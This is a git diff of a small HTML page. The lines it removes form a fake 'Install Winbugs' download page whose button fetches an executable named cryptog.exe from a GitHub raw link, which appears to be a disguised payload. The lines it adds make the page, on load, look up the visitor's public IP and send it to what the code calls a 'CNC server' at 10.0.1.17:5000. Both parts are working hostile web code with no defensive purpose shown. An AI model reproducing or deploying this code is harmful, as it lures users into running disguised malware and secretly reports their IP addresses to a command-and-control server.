@@ -3,18 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Install Winbugs</title>
+    <title>Get User IP and Send to CNC Server</title>
 </head>
 <body>
-    <h1>Install Winbugs</h1>
-    <p>Click the button below to download and install Winbugs.</p>
-
-    <button onclick="downloadFile()">Download Winbugs.exe</button>
+    <h1>Your IP Address</h1>
+    <p id="ip-address">Loading...</p>
 
     <script>
-        function downloadFile() {
-            window.location.href = "https://github.com/hubertloudgfdxgx/huber.github.io/raw/refs/heads/main/cryptog.exe";
-        }
+        // Use a public API to get the user's IP address
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const userIp = data.ip;
+                document.getElementById('ip-address').innerText = "Baba z mokřin: " + userIp;
+
+                // Send the IP to the CNC server (use your public IP)
+                fetch('http://10.0.1.17:5000/report_ip', {  // Replace with your actual public IP
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ ip: userIp })
+                })
+                .then(response => response.json())
+                .then(data => console.log('IP sent successfully:', data))
+                .catch(error => console.error('Error sending IP:', error));
+            })
+            .catch(error => {
+                document.getElementById('ip-address').innerText = 'Failed to get IP address';
+                console.error('Error fetching IP:', error);
+            });
     </script>
 </body>
 </html>
